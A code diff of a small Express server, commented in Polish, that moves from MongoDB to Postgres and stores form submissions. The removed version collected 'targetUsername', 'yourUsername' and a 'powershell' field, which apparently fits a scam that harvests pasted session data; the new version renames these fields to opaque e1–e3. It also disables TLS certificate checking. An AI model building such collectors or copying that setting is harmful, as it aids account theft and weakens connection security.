@@ -1,90 +1,78 @@
 const express = require("express");
-const { MongoClient } = require("mongodb");
+const { Pool } = require("pg");
 require("dotenv").config();
 
 const app = express();
+const PORT = 3000;
 
-// Render ustawia własny PORT, lokalnie użyje 3000
-const PORT = process.env.PORT || 3000;
-
-// Middleware
 app.use(express.json({ limit: "5mb" }));
 app.use(express.static("public"));
 
-// Sprawdzenie URI MongoDB
-if (!process.env.MONGODB_URI) {
-console.error("❌ Brak MONGODB_URI w zmiennych środowiskowych!");
-process.exit(1);
-}
+// Render Postgres wymaga SSL, ale zwykle z certyfikatem self-signed,
+// stąd rejectUnauthorized: false
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+    ssl: {
+        rejectUnauthorized: false
+    }
+});
 
-// Połączenie MongoDB
-const client = new MongoClient(process.env.MONGODB_URI);
+async function createTableIfNotExists() {
+    await pool.query(`
+        CREATE TABLE IF NOT EXISTS submissions (
+            id SERIAL PRIMARY KEY,
+            e1 TEXT NOT NULL,
+            e2 TEXT NOT NULL,
+            e3 TEXT NOT NULL,
+            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+        );
+    `);
+}
 
 async function start() {
-try {
-console.log("⏳ Łączenie z MongoDB...");
+    try {
+        await pool.query("SELECT 1"); // test połączenia
+        console.log("Połączono z Postgres!");
 
-    await client.connect();
+        await createTableIfNotExists();
+        console.log("Tabela 'submissions' gotowa.");
 
-    console.log("✅ Połączono z MongoDB!");
+        app.post("/api/submit", async (req, res) => {
+            try {
+                const { e1, e2, e3 } = req.body;
 
-    const db = client.db("joinApp");
-    const submissions = db.collection("submissions");
+                if (!e1 || !e2 || !e3) {
+                    return res.status(400).json({
+                        error: "Wszystkie pola są wymagane."
+                    });
+                }
 
-    // Endpoint do zapisywania danych
-    app.post("/api/submit", async (req, res) => {
-        try {
-            const {
-                targetUsername,
-                yourUsername,
-                powershell
-            } = req.body;
+                const result = await pool.query(
+                    `INSERT INTO submissions (e1, e2, e3) VALUES ($1, $2, $3) RETURNING id`,
+                    [e1, e2, e3]
+                );
 
-            if (!targetUsername || !yourUsername || !powershell) {
-                return res.status(400).json({
-                    error: "Wszystkie pola są wymagane."
+                res.json({
+                    success: true,
+                    id: result.rows[0].id
+                });
+
+            } catch (error) {
+                console.error(error);
+
+                res.status(500).json({
+                    error: "Nie udało się zapisać danych."
                 });
             }
-
-            const result = await submissions.insertOne({
-                targetUsername,
-                yourUsername,
-                powershell,
-                createdAt: new Date()
-            });
-
-            res.json({
-                success: true,
-                id: result.insertedId
-            });
-
-        } catch (error) {
-            console.error("Błąd zapisu do MongoDB:", error);
-
-            res.status(500).json({
-                error: "Nie udało się zapisać danych."
-            });
-        }
-    });
-
-    // Prosty test działania serwera
-    app.get("/api/health", (req, res) => {
-        res.json({
-            status: "ok",
-            database: "connected"
         });
-    });
 
-    // Uruchomienie serwera
-    app.listen(PORT, "0.0.0.0", () => {
-        console.log(`🚀 Serwer działa na porcie ${PORT}`);
-    });
+        app.listen(PORT, () => {
+            console.log(`Strona działa: http://localhost:${PORT}`);
+        });
 
-} catch (error) {
-    console.error("❌ Błąd połączenia z MongoDB:", error);
-    process.exit(1);
-}
-
+    } catch (error) {
+        console.error("Błąd połączenia z Postgres:", error);
+    }
 }
 
 start();
